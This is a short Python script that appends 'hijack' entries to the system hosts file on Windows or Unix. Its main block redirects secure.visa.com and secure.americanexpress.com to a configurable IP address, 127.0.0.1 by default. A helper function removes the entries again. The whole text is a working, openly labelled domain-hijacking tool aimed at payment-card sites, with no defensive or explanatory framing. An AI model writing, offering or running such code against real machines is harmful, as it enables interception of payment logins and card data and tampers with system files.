import platform
import os

HOSTFILE_PATH = r"C:\Windows\System32\drivers\etc\hosts" if platform.system() == "Windows" else "/etc/hosts"

def add_hijack_entry(domain, redirect_ip="127.0.0.1"):
    entry = f"{redirect_ip} {domain}\n"
    with open(HOSTFILE_PATH, "a") as f:
        f.write(entry)
    print(f"Added hijack entry: {domain} -> {redirect_ip}")

def remove_hijack_entry(domain):
    with open(HOSTFILE_PATH, "r") as f:
        lines = f.readlines()
    with open(HOSTFILE_PATH, "w") as f:
        for line in lines:
            if domain not in line:
                f.write(line)
    print(f"Removed hijack entry for: {domain}")

if __name__ == "__main__":
    add_hijack_entry("secure.visa.com")
    add_hijack_entry("secure.americanexpress.com")
